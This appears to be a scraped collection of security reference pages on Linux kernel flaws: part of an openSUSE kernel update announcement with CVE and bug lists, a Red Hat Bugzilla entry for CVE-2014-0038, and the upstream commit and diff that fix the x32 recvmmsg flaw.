dereference (bnc#854173 CVE-2013-6431).
- keys: fix race with concurrent install\_user\_keyrings()
(bnc#808358)(CVE-2013-1792).
- KVM: x86: Convert vapic synchronization to \_cached
functions (CVE-2013-6368) (bnc#853052 CVE-2013-6368).
- wireless: radiotap: fix parsing buffer overrun
(bnc#854634 CVE-2013-7027).
- KVM: x86: fix guest-initiated crash with x2apic
(CVE-2013-6376) (bnc#853053 CVE-2013-6376).
- KVM: x86: Fix potential divide by 0 in lapic
(CVE-2013-6367) (bnc#853051 CVE-2013-6367).
- KVM: Improve create VCPU parameter (CVE-2013-4587)
(bnc#853050 CVE-2013-4587).
- staging: ozwpan: prevent overflow in oz\_cdev\_write()
(bnc#849023 CVE-2013-4513).
- perf/x86: Fix offcore\_rsp valid mask for SNB/IVB
(bnc#825006).
- perf/x86: Add Intel IvyBridge event scheduling
constraints (bnc#825006).
- libertas: potential oops in debugfs (bnc#852559
CVE-2013-6378).
- aacraid: prevent invalid pointer dereference (bnc#852373
CVE-2013-6380).
- staging: wlags49\_h2: buffer overflow setting station name
(bnc#849029 CVE-2013-4514).
- net: flow\_dissector: fail on evil iph->ihl (bnc#848079
CVE-2013-4348).
- Staging: bcm: info leak in ioctl (bnc#849034
CVE-2013-4515).
- Refresh
patches.fixes/net-rework-recvmsg-handler-msg\_name-and-msg\_na
melen-logic.patch.
- ipv6: remove max\_addresses check from
ipv6\_create\_tempaddr (bnc#805226, CVE-2013-0343).
- net: rework recvmsg handler msg\_name and msg\_namelen
logic (bnc#854722).
- crypto: ansi\_cprng - Fix off by one error in non-block
size request (bnc#840226).
- x6: Fix reserve\_initrd so that acpi\_initrd\_override is
reached (bnc#831836).
- Refresh other Xen patches.
- aacraid: missing capable() check in compat ioctl
(bnc#852558).
-
patches.fixes/gpio-ich-fix-ichx\_gpio\_check\_available-return.
patch: Update upstream reference
- perf/ftrace: Fix paranoid level for enabling function
tracer (bnc#849362).
- xhci: fix null pointer dereference on
ring\_doorbell\_for\_active\_rings (bnc#848255).
- xhci: Fix oops happening after address device timeout
(bnc#848255).
- xhci: Ensure a command structure points to the correct
trb on the command ring (bnc#848255).
-
patches.arch/iommu-vt-d-remove-stack-trace-from-broken-irq-r
emapping-warning.patch: Update upstream reference.
- Allow NFSv4 username mapping to work properly
(bnc#838024).
- Refresh btrfs attribute publishing patchset to match
openSUSE-13.1 No user-visible changes, but uses
kobj\_sysfs\_ops and better kobject lifetime management.
- Fix a few incorrectly checked [io\_]remap\_pfn\_range()
calls (bnc#849021, CVE-2013-4511).
- drm/radeon: don't set hpd, afmt interrupts when
interrupts are disabled.
-
patches.fixes/cifs-fill-TRANS2\_QUERY\_FILE\_INFO-ByteCount-fie
lds.patch: Fix TRANS2\_QUERY\_FILE\_INFO ByteCount fields
(bnc#804950).
- iommu: Remove stack trace from broken irq remapping
warning (bnc#844513).
- Disable patches related to bnc#840656
patches.suse/btrfs-cleanup-don-t-check-the-same-thing-twice
patches.suse/btrfs-0220-fix-for-patch-cleanup-don-t-check-th
e-same-thi.patch
- btrfs: use feature attribute names to print better error
messages.
- btrfs: add ability to change features via sysfs.
- btrfs: add publishing of unknown features in sysfs.
- btrfs: publish per-super features to sysfs.
- btrfs: add per-super attributes to sysfs.
- btrfs: export supported featured to sysfs.
- kobject: introduce kobj\_completion.
- btrfs: add ioctls to query/change feature bits online.
- btrfs: use btrfs\_commit\_transaction when setting fslabel.
- x86/iommu/vt-d: Expand interrupt remapping quirk to cover
x58 chipset (bnc#844513).
- NFSv4: Fix issues in nfs4\_discover\_server\_trunking
(bnc#811746).
- iommu/vt-d: add quirk for broken interrupt remapping on
55XX chipsets (bnc#844513).
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 12.3:
zypper in -t patch openSUSE-2014-113
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 12.3 (i586 x86\_64):
kernel-default-3.7.10-1.28.1
kernel-default-base-3.7.10-1.28.1
kernel-default-base-debuginfo-3.7.10-1.28.1
kernel-default-debuginfo-3.7.10-1.28.1
kernel-default-debugsource-3.7.10-1.28.1
kernel-default-devel-3.7.10-1.28.1
kernel-default-devel-debuginfo-3.7.10-1.28.1
kernel-syms-3.7.10-1.28.1
- openSUSE 12.3 (i686 x86\_64):
kernel-debug-3.7.10-1.28.1
kernel-debug-base-3.7.10-1.28.1
kernel-debug-base-debuginfo-3.7.10-1.28.1
kernel-debug-debuginfo-3.7.10-1.28.1
kernel-debug-debugsource-3.7.10-1.28.1
kernel-debug-devel-3.7.10-1.28.1
kernel-debug-devel-debuginfo-3.7.10-1.28.1
kernel-desktop-3.7.10-1.28.1
kernel-desktop-base-3.7.10-1.28.1
kernel-desktop-base-debuginfo-3.7.10-1.28.1
kernel-desktop-debuginfo-3.7.10-1.28.1
kernel-desktop-debugsource-3.7.10-1.28.1
kernel-desktop-devel-3.7.10-1.28.1
kernel-desktop-devel-debuginfo-3.7.10-1.28.1
kernel-ec2-3.7.10-1.28.1
kernel-ec2-base-3.7.10-1.28.1
kernel-ec2-base-debuginfo-3.7.10-1.28.1
kernel-ec2-debuginfo-3.7.10-1.28.1
kernel-ec2-debugsource-3.7.10-1.28.1
kernel-ec2-devel-3.7.10-1.28.1
kernel-ec2-devel-debuginfo-3.7.10-1.28.1
kernel-trace-3.7.10-1.28.1
kernel-trace-base-3.7.10-1.28.1
kernel-trace-base-debuginfo-3.7.10-1.28.1
kernel-trace-debuginfo-3.7.10-1.28.1
kernel-trace-debugsource-3.7.10-1.28.1
kernel-trace-devel-3.7.10-1.28.1
kernel-trace-devel-debuginfo-3.7.10-1.28.1
kernel-vanilla-3.7.10-1.28.1
kernel-vanilla-debuginfo-3.7.10-1.28.1
kernel-vanilla-debugsource-3.7.10-1.28.1
kernel-vanilla-devel-3.7.10-1.28.1
kernel-vanilla-devel-debuginfo-3.7.10-1.28.1
kernel-xen-3.7.10-1.28.1
kernel-xen-base-3.7.10-1.28.1
kernel-xen-base-debuginfo-3.7.10-1.28.1
kernel-xen-debuginfo-3.7.10-1.28.1
kernel-xen-debugsource-3.7.10-1.28.1
kernel-xen-devel-3.7.10-1.28.1
kernel-xen-devel-debuginfo-3.7.10-1.28.1
- openSUSE 12.3 (noarch):
kernel-devel-3.7.10-1.28.1
kernel-docs-3.7.10-1.28.2
kernel-source-3.7.10-1.28.1
kernel-source-vanilla-3.7.10-1.28.1
- openSUSE 12.3 (i686):
kernel-pae-3.7.10-1.28.1
kernel-pae-base-3.7.10-1.28.1
kernel-pae-base-debuginfo-3.7.10-1.28.1
kernel-pae-debuginfo-3.7.10-1.28.1
kernel-pae-debugsource-3.7.10-1.28.1
kernel-pae-devel-3.7.10-1.28.1
kernel-pae-devel-debuginfo-3.7.10-1.28.1
References:
<http://support.novell.com/security/cve/CVE-2013-0343.html>
<http://support.novell.com/security/cve/CVE-2013-1792.html>
<http://support.novell.com/security/cve/CVE-2013-4348.html>
<http://support.novell.com/security/cve/CVE-2013-4511.html>
<http://support.novell.com/security/cve/CVE-2013-4513.html>
<http://support.novell.com/security/cve/CVE-2013-4514.html>
<http://support.novell.com/security/cve/CVE-2013-4515.html>
<http://support.novell.com/security/cve/CVE-2013-4587.html>
<http://support.novell.com/security/cve/CVE-2013-6367.html>
<http://support.novell.com/security/cve/CVE-2013-6368.html>
<http://support.novell.com/security/cve/CVE-2013-6376.html>
<http://support.novell.com/security/cve/CVE-2013-6378.html>
<http://support.novell.com/security/cve/CVE-2013-6380.html>
<http://support.novell.com/security/cve/CVE-2013-6431.html>
<http://support.novell.com/security/cve/CVE-2013-7027.html>
<http://support.novell.com/security/cve/CVE-2014-0038.html>
<https://bugzilla.novell.com/804950>
<https://bugzilla.novell.com/805226>
<https://bugzilla.novell.com/808358>
<https://bugzilla.novell.com/811746>
<https://bugzilla.novell.com/825006>
<https://bugzilla.novell.com/831836>
<https://bugzilla.novell.com/838024>
<https://bugzilla.novell.com/840226>
<https://bugzilla.novell.com/840656>
<https://bugzilla.novell.com/844513>
<https://bugzilla.novell.com/848079>
<https://bugzilla.novell.com/848255>
<https://bugzilla.novell.com/849021>
<https://bugzilla.novell.com/849023>
<https://bugzilla.novell.com/849029>
<https://bugzilla.novell.com/849034>
<https://bugzilla.novell.com/849362>
<https://bugzilla.novell.com/852373>
<https://bugzilla.novell.com/852558>
<https://bugzilla.novell.com/852559>
<https://bugzilla.novell.com/853050>
<https://bugzilla.novell.com/853051>
<https://bugzilla.novell.com/853052>
<https://bugzilla.novell.com/853053>
<https://bugzilla.novell.com/854173>
<https://bugzilla.novell.com/854634>
<https://bugzilla.novell.com/854722>
<https://bugzilla.novell.com/860993>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/LVUAZOUKQZFEYUPQYU5QOR2Y3GSESDMA/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/LVUAZOUKQZFEYUPQYU5QOR2Y3GSESDMA/#LVUAZOUKQZFEYUPQYU5QOR2Y3GSESDMA)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from bugzilla.redhat.com_a59594eb_20250124_220422.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1060023)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1060023)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1060023)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1060023

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1060023**](show_bug.cgi?id=1060023)
(CVE-2014-0038)
- [CVE-2014-0038](https://access.redhat.com/security/cve/CVE-2014-0038) Kernel: 3.4+ arbitrary write with CONFIG\_X86\_X32

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2014-0038 Kernel: 3.4+ arbitrary write with CONFIG\_X86\_X32

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED NOTABUG | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2014-0038 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1059980](show_bug.cgi?id=1059980) | | TreeView+ | [depends on](buglist.cgi?bug_id=1060023&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1060023&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2014-01-31 09:35 UTC by Prasad Pandit | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-05 18:57 UTC ([History](show_activity.cgi?id=1060023)) | | [CC List:](page.cgi?id=fields.html#cclist) | 10 users (show)  davej gansalmon itamar jforbes jonathan jwboyer kernel-maint madhu.chinakonda pmatouse pneedle | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2014-01-31 09:58:26 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1060023#c0)  Prasad Pandit    2014-01-31 09:35:03 UTC  ``` Linux kernel(>= version 3.4+) built with the X32 ABI for 64-bit mode support CONFIG_X86_X32, is vulnerable to an arbitrary write to a user supplied address. X32 ABI allows 32-bit programs to run on 64-bit machines with all its features, without using the 64-bit addressing. These programs continue to use 32-bit memory addressing. The flaw occurs while doing a recvmmsg(2) call.  A user/program could use this flaw to crash the system resulting in DoS or potentially escalate user privileges to a system.  Upstream fix: -------------  -> <https://git.kernel.org/linus/2def2ef2ae5f3990aabdbe8a755911902707d268>  Reference: ----------  -> <http://www.openwall.com/lists/oss-security/2014/01/31/2>   ```  [Comment 1](show_bug.cgi?id=1060023#c1)  Petr Matousek    2014-01-31 09:58:26 UTC  ``` Statement:  Not vulnerable. This issue does not affect the versions of the kernel package as shipped with Red Hat Enterprise Linux 5, 6 and Red Hat Enterprise MRG 2.   ```  [Comment 3](show_bug.cgi?id=1060023#c3)  Tomas Hoger    2014-02-17 10:01:30 UTC  ``` HackerOne report: <https://hackerone.com/reports/960>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1060023&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from github.com_3b1b521d_20250124_220428.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F2def2ef2ae5f3990aabdbe8a755911902707d268)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F2def2ef2ae5f3990aabdbe8a755911902707d268)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=torvalds%2Flinux)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[torvalds](/torvalds)
/
**[linux](/torvalds/linux)**
Public

* [Notifications](/login?return_to=%2Ftorvalds%2Flinux) You must be signed in to change notification settings
* [Fork
  54.9k](/login?return_to=%2Ftorvalds%2Flinux)
* [Star
   186k](/login?return_to=%2Ftorvalds%2Flinux)

* [Code](/torvalds/linux)
* [Pull requests
  437](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects
  0](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

Additional navigation options

* [Code](/torvalds/linux)
* [Pull requests](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

## Commit

[Permalink](/torvalds/linux/commit/2def2ef2ae5f3990aabdbe8a755911902707d268)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

x86, x32: Correct invalid use of user timespec in the kernel

[Browse files](/torvalds/linux/tree/2def2ef2ae5f3990aabdbe8a755911902707d268)
Browse the repository at this point in the history

```
The x32 case for the recvmsg() timout handling is broken:

  asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,
                                      unsigned int vlen, unsigned int flags,
                                      struct compat_timespec __user *timeout)
  {
          int datagrams;
          struct timespec ktspec;

          if (flags & MSG_CMSG_COMPAT)
                  return -EINVAL;

          if (COMPAT_USE_64BIT_TIME)
                  return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
                                        flags | MSG_CMSG_COMPAT,
                                        (struct timespec *) timeout);
          ...

The timeout pointer parameter is provided by userland (hence the __user
annotation) but for x32 syscalls it's simply cast to a kernel pointer
and is passed to __sys_recvmmsg which will eventually directly
dereference it for both reading and writing.  Other callers to
__sys_recvmmsg properly copy from userland to the kernel first.

The bug was introduced by commit [ee4fa23](https://github.com/torvalds/linux/commit/ee4fa23c4bfcc635d077a9633d405610de45bc70) ("compat: Use
COMPAT_USE_64BIT_TIME in net/compat.c") and should affect all kernels
since 3.4 (and perhaps vendor kernels if they backported x32 support
along with this code).

Note that CONFIG_X86_X32_ABI gets enabled at build time and only if
CONFIG_X86_X32 is enabled and ld can build x32 executables.

Other uses of COMPAT_USE_64BIT_TIME seem fine.

This addresses [CVE-2014-0038](https://github.com/advisories/GHSA-wvfw-q8jv-g9r2 "CVE-2014-0038").

Signed-off-by: PaX Team <pageexec@freemail.hu>
Signed-off-by: H. Peter Anvin <hpa@linux.intel.com>
Cc: <stable@vger.kernel.org> # v3.4+
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
```

* Loading branch information

[![@torvalds](https://avatars.githubusercontent.com/u/1024025?s=40&v=4)](/torvalds)

PaX Team
authored and
[torvalds](/torvalds/linux/commits?author=torvalds "View all commits by torvalds")
committed
Jan 31, 2014

1 parent
[12f2bbd](/torvalds/linux/commit/12f2bbd609006f983c1c99d240cf61e6e829a14c)

commit 2def2ef

Showing
**1 changed file**
with
**2 additions**
and
**7 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

9 changes: 2 additions & 7 deletions

9
[net/compat.c](#diff-2fa9421aa66026c59070181d761542e35bc78af2406946695d11bd1186dff9ee "net/compat.c")

Show comments

[View file](/torvalds/linux/blob/2def2ef2ae5f3990aabdbe8a755911902707d268/net/compat.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -780,21 +780,16 @@ asmlinkage long compat\_sys\_recvmmsg(int fd, struct compat\_mmsghdr \_\_user \*mmsg, |
|  |  | if (flags & MSG\_CMSG\_COMPAT) |
|  |  | return -EINVAL; |
|  |  |  |
|  |  | if (COMPAT\_USE\_64BIT\_TIME) |
|  |  | return \_\_sys\_recvmmsg(fd, (struct mmsghdr \_\_user \*)mmsg, vlen, |
|  |  | flags | MSG\_CMSG\_COMPAT, |
|  |  | (struct timespec \*) timeout); |
|  |  |  |
|  |  | if (timeout == NULL) |
|  |  | return \_\_sys\_recvmmsg(fd, (struct mmsghdr \_\_user \*)mmsg, vlen, |
|  |  | flags | MSG\_CMSG\_COMPAT, NULL); |
|  |  |  |
|  |  | if (get\_compat\_timespec(&ktspec, timeout)) |
|  |  | if (compat\_get\_timespec(&ktspec, timeout)) |
|  |  | return -EFAULT; |
|  |  |  |
|  |  | datagrams = \_\_sys\_recvmmsg(fd, (struct mmsghdr \_\_user \*)mmsg, vlen, |
|  |  | flags | MSG\_CMSG\_COMPAT, &ktspec); |
|  |  | if (datagrams > 0 && put\_compat\_timespec(&ktspec, timeout)) |
|  |  | if (datagrams > 0 && compat\_put\_timespec(&ktspec, timeout)) |
|  |  | datagrams = -EFAULT; |
|  |  |  |
|  |  | return datagrams; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `2def2ef`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F2def2ef2ae5f3990aabdbe8a755911902707d268) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugzilla.novell.com_a0a2a0df_20250126_034923.html ===




=== Content from bugzilla.novell.com_ac121c32_20250126_034929.html ===




=== Content from access.redhat.com_6838ab41_20250126_034943.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
